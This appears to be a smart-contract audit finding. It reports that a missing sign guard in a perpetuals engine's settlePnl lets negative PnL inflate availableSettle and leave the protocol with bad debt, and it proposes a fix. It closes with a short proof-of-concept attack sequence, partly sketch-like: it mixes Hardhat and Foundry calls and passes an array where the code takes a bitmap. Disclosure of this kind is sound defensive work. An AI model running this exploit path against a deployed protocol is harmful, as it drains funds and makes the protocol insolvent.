### Title
Negative-PnL Settlement Inverts Accounting, Inflating `availableSettle` and Creating Protocol Bad Debt — (`core/contracts/PerpEngine.sol`)

---

### Summary

`PerpEngine.settlePnl` calls `getSettlementState`, which returns `canSettle = MathHelper.min(positionPnl, state.availableSettle)`. When `positionPnl < 0` and `state.availableSettle > 0`, `canSettle` is **negative**. The function then applies `state.availableSettle -= canSettle` and `balance.vQuoteBalance -= canSettle` with no sign guard, reversing the intended direction of every accounting mutation. The resulting negative `totalSettled` is passed to `Clearinghouse._settlePnl`, which calls `spotEngine.updateBalance(QUOTE_PRODUCT_ID, subaccount, negativeAmount)`, destroying the subaccount's real spot quote. Meanwhile `state.availableSettle` is inflated without any real asset backing, creating protocol bad debt.

---

### Finding Description

**`getSettlementState`** computes the settleable amount as:

```solidity
availableSettle = MathHelper.min(
    calculatePositionPnl(balance, productId),
    state.availableSettle
);
``` [1](#0-0) 

`MathHelper.min` is an unconstrained signed comparison:

```solidity
function min(int128 a, int128 b) internal pure returns (int128) {
    return a < b ? a : b;
}
``` [2](#0-1) 

When `positionPnl < 0` and `state.availableSettle > 0`, `min` returns the negative `positionPnl`. This negative value is then used unconditionally in `settlePnl`:

```solidity
state.availableSettle -= canSettle;   // subtracts negative → INCREASES
balance.vQuoteBalance -= canSettle;   // subtracts negative → INCREASES
totalSettled += canSettle;            // adds negative → NEGATIVE
``` [3](#0-2) 

There is no `if (canSettle <= 0) continue;` guard anywhere in the loop. The negative `totalSettled` is returned to `Clearinghouse._settlePnl`:

```solidity
int128 amountSettled = perpEngine.settlePnl(subaccount, productIds);
_spotEngine().updateBalance(QUOTE_PRODUCT_ID, subaccount, amountSettled);
``` [4](#0-3) 

`amountSettled` is negative, so the subaccount's spot quote balance is **decreased** by the magnitude of the negative PnL.

---

### Impact Explanation

For a single settlement call with `positionPnl = -X` (X > 0) and `state.availableSettle > 0`:

| State variable | Expected change | Actual change |
|---|---|---|
| `state.availableSettle` | unchanged or decreases | **increases by X** |
| `balance.vQuoteBalance` | unchanged or decreases | **increases by X** (less negative) |
| Subaccount spot quote | unchanged or increases | **decreases by X** |

The subaccount's total mark-to-market value is unchanged (spot −X, perp vQuote +X), but `state.availableSettle` is inflated by X with no real asset backing. Profitable traders who later call `settlePnl` draw against this phantom balance, receiving real spot quote that does not exist, making the protocol insolvent. The spot quote destroyed from the victim's account is not transferred anywhere — it is simply annihilated, widening the gap between `availableSettle` and actual backing assets.

---

### Likelihood Explanation

`SettlePnl` is **not** in the owner-only list inside `submitSlowModeTransactionImpl`. It falls into the default `else` branch, which only charges a slow mode fee:

```solidity
} else {
    chargeSlowModeFee(_getQuote(), sender);
    slowModeFees += SLOW_MODE_FEE;
}
``` [5](#0-4) 

Any user can submit a `SettlePnl` slow-mode transaction targeting any subaccount (including their own) with any `productIds` bitmap. After the three-day delay, the transaction executes. No sequencer compromise is required. The precondition (`positionPnl < 0` with `state.availableSettle > 0`) is a normal market state that occurs whenever a perp product has open interest and some traders are underwater.

---

### Recommendation

In `PerpEngine.settlePnl`, skip the product if `canSettle` is not positive:

```solidity
if (canSettle <= 0) {
    productIds >>= 32;
    continue;
}
```

This should be inserted immediately after the `getSettlementState` call, before any state mutations. Alternatively, clamp inside `getSettlementState`:

```solidity
availableSettle = MathHelper.max(
    0,
    MathHelper.min(calculatePositionPnl(balance, productId), state.availableSettle)
);
```

---

### Proof of Concept

```solidity
// Preconditions (set up in Hardhat):
// - perpProduct (productId=2) has state.availableSettle = 1000e18
// - attacker subaccount has balance.amount = -1, vQuoteBalance = -500e18
//   → positionPnl = price * (-1) + (-500e18) < 0, say = -600e18
// - attacker has spot quote balance = 1000e18

// Step 1: attacker submits SettlePnl slow-mode tx
endpoint.submitSlowModeTransaction(
    abi.encodePacked(
        uint8(IEndpoint.TransactionType.SettlePnl),
        abi.encode(IEndpoint.SettlePnl({
            subaccounts: [attackerSubaccount],
            productIds:  [uint256(2)]   // productId=2, even → perp
        }))
    )
);

// Step 2: advance time past SLOW_MODE_TX_DELAY, execute
vm.warp(block.timestamp + 3 days + 1);
endpoint.executeSlowModeTransaction();

// Assertions that FAIL (demonstrating the bug):
// state.availableSettle should be <= 1000e18, but is now 1600e18
assert(perpEngine.states(2).availableSettle <= 1000e18); // FAILS

// attacker spot quote should be >= 1000e18, but is now 400e18
assert(spotEngine.getBalance(0, attackerSubaccount).amount >= 1000e18); // FAILS

// totalSettled should be >= 0, but was -600e18
// (verified by reading amountSettled from _settlePnl return value)
``` [6](#0-5) [7](#0-6) [8](#0-7)

### Citations

**File:** core/contracts/PerpEngine.sol (L77-105)
```text
    function settlePnl(bytes32 subaccount, uint256 productIds)
        external
        returns (int128)
    {
        _assertInternal();
        int128 totalSettled = 0;

        while (productIds != 0) {
            uint32 productId = uint32(productIds & ((1 << 32) - 1));
            // otherwise it means the product is a spot.
            if (productId % 2 == 0) {
                (
                    int128 canSettle,
                    State memory state,
                    Balance memory balance
                ) = getSettlementState(productId, subaccount);

                state.availableSettle -= canSettle;
                balance.vQuoteBalance -= canSettle;

                totalSettled += canSettle;

                _setState(productId, state);
                _setBalanceAndUpdateBitmap(productId, subaccount, balance);
            }
            productIds >>= 32;
        }
        return totalSettled;
    }
```

**File:** core/contracts/PerpEngine.sol (L125-139)
```text
    function getSettlementState(uint32 productId, bytes32 subaccount)
        public
        returns (
            int128 availableSettle,
            State memory state,
            Balance memory balance
        )
    {
        (state, balance) = getStateAndBalance(productId, subaccount);

        availableSettle = MathHelper.min(
            calculatePositionPnl(balance, productId),
            state.availableSettle
        );
    }
```

**File:** core/contracts/libraries/MathHelper.sol (L15-17)
```text
    function min(int128 a, int128 b) internal pure returns (int128) {
        return a < b ? a : b;
    }
```

**File:** core/contracts/Clearinghouse.sol (L617-627)
```text
    function _settlePnl(bytes32 subaccount, uint256 productIds) internal {
        IPerpEngine perpEngine = _perpEngine();

        int128 amountSettled = perpEngine.settlePnl(subaccount, productIds);

        _spotEngine().updateBalance(
            QUOTE_PRODUCT_ID,
            subaccount,
            amountSettled
        );
    }
```

**File:** core/contracts/EndpointTx.sol (L369-372)
```text
        } else {
            chargeSlowModeFee(_getQuote(), sender);
            slowModeFees += SLOW_MODE_FEE;
        }
```
